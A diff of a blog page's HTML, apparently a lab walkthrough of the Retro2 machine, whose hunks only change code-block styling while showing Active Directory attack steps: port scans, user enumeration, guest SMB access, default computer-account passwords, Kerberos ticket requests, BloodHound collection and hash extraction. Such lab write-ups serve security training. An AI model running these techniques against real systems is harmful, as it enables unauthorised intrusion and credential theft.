@@ -243,7 +243,7 @@
 <h3 id="nmap">NMAP:</h3>
 <h4 id="basic-scans">Basic Scans:</h4>
 <p><strong>TCP</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
 </span></span><span style="display:flex;"><span>nmap $box -Pn -oA TCPbasicScan
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#Results</span>
@@ -271,7 +271,7 @@
 <li><strong>Initial thoughts</strong>: Looks to be a domain controller as we have DNS (<code>53</code>), Kerberos (<code>88</code>), rpc (<code>135</code>), ldap (<code>389, 636</code>) &amp; smb (<code>445</code>).</li>
 </ul>
 <h4 id="comprehensive-scans">Comprehensive Scans:</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#Command</span>
 </span></span><span style="display:flex;"><span>sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#Results</span>
@@ -351,7 +351,7 @@
 <ul>
 <li>SMB 2 is being used, as well as it&rsquo;s running Windows server 2008 R2 Datacenter.</li>
 <li>We also have the domain &amp; computer name.
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>      | rdp-ntlm-info:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>      | rdp-ntlm-info:
 </span></span><span style="display:flex;"><span>      |   Target_Name: RETRO2
 </span></span><span style="display:flex;"><span>      |   NetBIOS_Domain_Name: RETRO2
 </span></span><span style="display:flex;"><span>      |   NetBIOS_Computer_Name: BLN01
@@ -396,9 +396,9 @@
 <li>It will also search the domain for any service/svc accounts and place them in a folder too.</li>
 </ul>
 <p>Let&rsquo;s run it and see what we get back.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 /home/kali/windowsTools/enumeration/ldapire/ldapire.py $box
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 /home/kali/windowsTools/enumeration/ldapire/ldapire.py $box
 </span></span></code></pre></div><p>It turns out the anonymous bind is (+NOT+) enabled and we get the below information.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>------------------------------------------------------------
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>------------------------------------------------------------
 </span></span><span style="display:flex;"><span> Connection Attempts
 </span></span><span style="display:flex;"><span>------------------------------------------------------------
 </span></span><span style="display:flex;"><span>  • Attempting SSL connection...
@@ -415,7 +415,7 @@
 </span></span><span style="display:flex;"><span>  • Server may be unreachable
 </span></span><span style="display:flex;"><span>  • LDAP/LDAPS ports may be filtered
 </span></span></code></pre></div><p>We do still get some very valuable information. Here we have the full server name &amp; domain name, we got this from nmap also.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>------------------------------------------------------------
 </span></span><span style="display:flex;"><span> Server Information
 </span></span><span style="display:flex;"><span>------------------------------------------------------------
@@ -423,7 +423,7 @@
 </span></span><span style="display:flex;"><span>  • Domain Name : retro2.vl
 </span></span><span style="display:flex;"><span>  • Server Name : BLN01
 </span></span></code></pre></div><p>We also get the domain functionality level.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>  • Forest Level: <span style="color:#ae81ff">4</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>  • Forest Level: <span style="color:#ae81ff">4</span>
 </span></span><span style="display:flex;"><span>  • Domain Level: <span style="color:#ae81ff">4</span>
 </span></span></code></pre></div><p>The functionality level determines the minimum version of Windows server that can be used for a DC.</p>
 <p>Knowing the function level is useful as if want to target the DC&rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.</p>
@@ -492,28 +492,28 @@
 </ul>
 <h3 id="updating-etc-hosts-and-variables">Updating <code>/etc/hosts</code> &amp; Variables:</h3>
 <p>I have a script I use to update variables in my <code>.zshrc</code> and as we now know the domain and machine values lets store them.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>update_var domain <span style="color:#e6db74">&#34;retro2.vl&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>update_var domain <span style="color:#e6db74">&#34;retro2.vl&#34;</span>
 </span></span><span style="display:flex;"><span>update_var machine <span style="color:#e6db74">&#34;BLN01&#34;</span>
 </span></span></code></pre></div><p>Now, I will update  <code>/etc/hosts</code> for DNS and &amp; further LDAP Queries.</p>
 <ul>
 <li>I update my <code>/etc/hosts</code> file to enable tools like <a href="https://github.com/ropnop/kerbrute"  target="_blank" rel="noreferrer nofollow">kerbrute</a>
  for user enumeration and other tools that require DNS or LDAP for queries:
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo echo <span style="color:#e6db74">&#34;</span>$box<span style="color:#e6db74">   </span>$domain<span style="color:#e6db74"> </span>$machine<span style="color:#e6db74">.</span>$domain<span style="color:#e6db74"> </span>$machine<span style="color:#e6db74">&#34;</span> | sudo tee -a /etc/hosts
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo echo <span style="color:#e6db74">&#34;</span>$box<span style="color:#e6db74">   </span>$domain<span style="color:#e6db74"> </span>$machine<span style="color:#e6db74">.</span>$domain<span style="color:#e6db74"> </span>$machine<span style="color:#e6db74">&#34;</span> | sudo tee -a /etc/hosts
 </span></span></code></pre></div></li>
 </ul>
 <h3 id="syncing-clocks-for-kerberos-exploitation">Syncing Clocks for Kerberos Exploitation:</h3>
 <p>Since Kerberos is enabled on this host, it&rsquo;s best practice to sync our clock with the host’s. This helps avoid issues from clock misalignment, which can cause false negatives in Kerberos exploitation attempts.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo ntpdate -s $domain
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo ntpdate -s $domain
 </span></span></code></pre></div><p>+Note+: I am doing this now as we have the DNS name etc.</p>
 <h3 id="dns-53">DNS <code>53</code>:</h3>
 <p>Let&rsquo;s use dnsenum to find if there are any interesting DNS records being served.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dnsenum -r --dnsserver $box --enum -p <span style="color:#ae81ff">0</span> -s <span style="color:#ae81ff">0</span> -f ~/Wordlists/seclists/Discovery/DNS/combined_subdomains.txt $domain
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dnsenum -r --dnsserver $box --enum -p <span style="color:#ae81ff">0</span> -s <span style="color:#ae81ff">0</span> -f ~/Wordlists/seclists/Discovery/DNS/combined_subdomains.txt $domain
 </span></span></code></pre></div><p>There were no hits for this.</p>
 <h3 id="kerberos-88">Kerberos <code>88</code>:</h3>
 <h4 id="using-kerbrute-to-bruteforce-usernames">Using <a href="https://github.com/ropnop/kerbrute"  target="_blank" rel="noreferrer nofollow">Kerbrute</a>
  to bruteforce Usernames:</h4>
 <p>Kerbrute is great for bruteforcing usernames/emails when kerberos is running.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt -o kerbruteUsers.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt -o kerbruteUsers.txt
 </span></span></code></pre></div><p>No hits.
 <p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-09-19-073118_.png" alt=""  />
@@ -521,7 +521,7 @@
 </p>
 <h4 id="using-netexec-for-asreproasting">Using netexec for ASReproasting:</h4>
 <p>We should always try and asreproast with a null/guest session as it can lead to an easy win</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec ldap $box -u <span style="color:#e6db74">&#39;&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --asreproast asrep.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec ldap $box -u <span style="color:#e6db74">&#39;&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --asreproast asrep.txt
 </span></span><span style="display:flex;"><span>netexec ldap $box -u guest -p <span style="color:#e6db74">&#39;&#39;</span> --asreproast asrep.txt
 </span></span></code></pre></div><p>No hits.
 <p class="imgp">
@@ -531,7 +531,7 @@
 <h3 id="smb-445">SMB <code>445</code>:</h3>
 <h4 id="attempting-to-connect-with-null-and-guest-sessions">Attempting to connect with NULL &amp; Guest sessions:</h4>
 <p>This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u <span style="color:#e6db74">&#39;guest&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --shares
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u <span style="color:#e6db74">&#39;guest&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --shares
 </span></span><span style="display:flex;"><span>netexec smb $box -u <span style="color:#e6db74">&#39;&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --shares
 </span></span></code></pre></div><p>We can see that we can access the SMB shares as a guest and have READ access to the Public share.
 <p class="imgp">
@@ -545,7 +545,7 @@ Anonymous connection does not work.
 </p>
 <h4 id="enumerating-users-with-impacket-lookupsid">Enumerating Users with Impacket-lookupsid:</h4>
 <p>Before we enumerate the shares let&rsquo;s use <code>impacket-lookupsid</code> to enumerate users &amp; groups on the domain, well anything that has a SID.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-lookupsid guest@<span style="color:#e6db74">&#34;</span>$box<span style="color:#e6db74">&#34;</span> -domain-sids -no-pass <span style="color:#ae81ff">\
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-lookupsid guest@<span style="color:#e6db74">&#34;</span>$box<span style="color:#e6db74">&#34;</span> -domain-sids -no-pass <span style="color:#ae81ff">\
 </span></span></span><span style="display:flex;"><span>| tee &gt;<span style="color:#f92672">(</span>awk -F<span style="color:#e6db74">&#39;\\\\| &#39;</span> <span style="color:#e6db74">&#39;/\(SidTypeUser\)/{print $3}&#39;</span> | sort -u &gt; sid_users.txt<span style="color:#f92672">)</span>
 </span></span></code></pre></div><p>We get alot of hits back, great!
 <p class="imgp">
@@ -562,7 +562,7 @@ Anonymous connection does not work.
 </ul>
 <h4 id="checking-usernames-as-passwords">Checking Usernames As Passwords:</h4>
 <p>As we have a list of users now let&rsquo;s check if anyone has their username set as their password.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u users_all.txt -p users_all.txt --shares --no-bruteforce
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u users_all.txt -p users_all.txt --shares --no-bruteforce
 </span></span></code></pre></div><p>As we can see they do not.
 <p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-09-19-082246_.png" alt=""  />
@@ -579,7 +579,7 @@ Anonymous connection does not work.
 </li>
 </ul>
 <p>As we have computer accounts in our extracted users let&rsquo;s check these to see if these still have default credentials &amp; have not joined the domain.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u machine_accounts.txt -p machine_passwords.txt --shares --no-bruteforce
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u machine_accounts.txt -p machine_passwords.txt --shares --no-bruteforce
 </span></span></code></pre></div><p>This is a hit as we got the <code>STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</code> error on the accounts <code>FSO1$</code> &amp; <code>FS02$</code>.
 <p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-09-19-082322_.png" alt=""  />
@@ -592,14 +592,14 @@ Anonymous connection does not work.
 <p>This could be a viable route forward.</p>
 <h3 id="finding-a-microsoft-access-database-file-in-the-public-share">Finding A Microsoft Access Database File In the Public Share:</h3>
 <p>Before we start requesting TGT&rsquo;s let&rsquo;s see what else we can do as the guest user. Lets spider the share for ease and check the results.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u <span style="color:#e6db74">&#39;guest&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> -M spider_plus
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u <span style="color:#e6db74">&#39;guest&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> -M spider_plus
 </span></span></code></pre></div><p>Two folders &amp; 1 file.
 <p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-09-19-074135_.png" alt=""  />
 </p>
 </p>
 <p>Lets see if there is anything of note:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat /home/kali/.nxc/modules/nxc_spider_plus/$box.json
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat /home/kali/.nxc/modules/nxc_spider_plus/$box.json
 </span></span></code></pre></div><p>Looks to be a file called <code>staff.accdb</code> within a <code>DB</code> folder.
 <p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-09-19-074242_.png" alt=""  />
@@ -614,16 +614,16 @@ Anonymous connection does not work.
 <p>Let&rsquo;s download the file to investigate further.</p>
 <h4 id="using-smbclient-to-download-the-staff-dot-aacdb-file">Using smbclient To Download The <code>staff.aacdb</code> File:</h4>
 <p>First we can connect with smbclient.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>smbclient -U <span style="color:#e6db74">&#39;guest&#39;</span> <span style="color:#e6db74">&#34;\\\\</span>$box<span style="color:#e6db74">\\public&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>smbclient -U <span style="color:#e6db74">&#39;guest&#39;</span> <span style="color:#e6db74">&#34;\\\\</span>$box<span style="color:#e6db74">\\public&#34;</span>
 </span></span></code></pre></div><p>Then we can download the file.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cd DB
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cd DB
 </span></span><span style="display:flex;"><span>get staff.accdb
 </span></span></code></pre></div><figure><img src="/ox-hugo/2025-09-19-075023_.png">
 </figure>
 
 <h3 id="trying-to-read-the-staff-dot-accdb-file">Trying To Read The <code>staff.accdb</code> File:</h3>
 <p>I discover online we can read the <code>.accdb</code> file using mdb-tables, so I install the tool suite.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo apt install mdbtools
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo apt install mdbtools
 </span></span></code></pre></div><p>However when trying to read the file we get the below error.
 <p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-09-20-060611_.png" alt=""  />
@@ -638,11 +638,11 @@ Anonymous connection does not work.
 </blockquote>
 <p>We can try modifying the first byte from <code>0xF3</code> to <code>0x02</code> like it wants.</p>
 <p>First we create a backup of the file.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cp staff.accdb staff.accdb.bak
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cp staff.accdb staff.accdb.bak
 </span></span></code></pre></div><p>Now we modify the first byte using dd:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>printf <span style="color:#e6db74">&#39;\x02&#39;</span> | dd of<span style="color:#f92672">=</span>staff.accdb bs<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> seek<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> count<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> conv<span style="color:#f92672">=</span>notrunc status<span style="color:#f92672">=</span>none
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>printf <span style="color:#e6db74">&#39;\x02&#39;</span> | dd of<span style="color:#f92672">=</span>staff.accdb bs<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> seek<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> count<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> conv<span style="color:#f92672">=</span>notrunc status<span style="color:#f92672">=</span>none
 </span></span></code></pre></div><p>We can verify this change is correct by comparing our backup of the file with the modified file.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># show first byte only (hex)</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># show first byte only (hex)</span>
 </span></span><span style="display:flex;"><span>xxd -l <span style="color:#ae81ff">1</span> -p staff.accdb
 </span></span></code></pre></div><p>As we can see the byte has changed from <code>00</code> to <code>00</code>
 <p class="imgp">
@@ -668,18 +668,18 @@ Anonymous connection does not work.
 <h2 id="2-dot-foothold">2. Foothold:</h2>
 <h3 id="requesting-kerberos-tgt-s-as-the-computer-accounts">Requesting Kerberos TGT&rsquo;s As The Computer Accounts:</h3>
 <p>We can use <code>impacket-getTGT</code> to request Kerberos tickets for the computer accounts.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-getTGT $domain/FS01<span style="color:#ae81ff">\$</span>:fs01
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-getTGT $domain/FS01<span style="color:#ae81ff">\$</span>:fs01
 </span></span><span style="display:flex;"><span>impacket-getTGT $domain/FS02<span style="color:#ae81ff">\$</span>:fs02
 </span></span></code></pre></div><figure><img src="/ox-hugo/2025-09-20-064431_.png">
 </figure>
 
 <p>Then we set the ENV KRB5CCNAME to point to the kerberos ticket:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>export KRB5CCNAME<span style="color:#f92672">=</span>./FS01<span style="color:#ae81ff">\$</span>.ccache
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>export KRB5CCNAME<span style="color:#f92672">=</span>./FS01<span style="color:#ae81ff">\$</span>.ccache
 </span></span></code></pre></div><figure><img src="/ox-hugo/2025-09-20-064758_.png">
 </figure>
 
 <p>Now we can verify access using netexec</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $domain --use-kcache --shares
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $domain --use-kcache --shares
 </span></span></code></pre></div><p><p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-09-20-065028_.png" alt=""  />
 </p>
@@ -691,7 +691,7 @@ We should also repeat the process as above for <code>FS02$</code>.
 </p>
 <h3 id="performing-a-bloodhound-collection">Performing a Bloodhound Collection:</h3>
 <p>As we now have valid credentials let&rsquo;s use bloodhound-python to perform a collection.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>bloodhound-python -d $domain -ns $box -u <span style="color:#e6db74">&#39;FS02$&#39;</span> -c All -k -no-pass
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>bloodhound-python -d $domain -ns $box -u <span style="color:#e6db74">&#39;FS02$&#39;</span> -c All -k -no-pass
 </span></span></code></pre></div><p><p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-09-20-070500_.png" alt=""  />
 </p>
@@ -735,7 +735,7 @@ We then import these into bloodhound for investigation.</p>
 <p>So when I am stumped I like to take a look at all the things I have accrued, documents, files etc and re-examine them incase I have missed something. This led me back to <code>staff.accdb</code>.</p>
 <h4 id="discovering-staff-dot-accdb-is-encrypted">Discovering <code>staff.accdb</code> Is Encrypted:</h4>
 <p>Looking at the <code>staff.accdb</code> file again if we run strings on it and pipe it into head to look at the first 10 lines we can see it is in fact encrypted &amp; this could be why we could not open it.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>strings staff.accdb | head
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>strings staff.accdb | head
 </span></span></code></pre></div><figure><img src="/ox-hugo/2025-09-21-055039_.png">
 </figure>
 
@@ -745,21 +745,21 @@ We then import these into bloodhound for investigation.</p>
 </p>
 </p>
 <h4 id="using-office2john-to-extract-the-aacdb-hash-and-crack-it">Using Office2john To Extract The <code>aacdb</code> Hash And Crack It:</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>staff.accdb &gt;&gt; accdb.hash
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>staff.accdb &gt;&gt; accdb.hash
 </span></span></code></pre></div><p>We have our hash.
 <p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-09-21-055653_.png" alt=""  />
 </p>
 </p>
 <p>Let&rsquo;s crack the hash:</p>
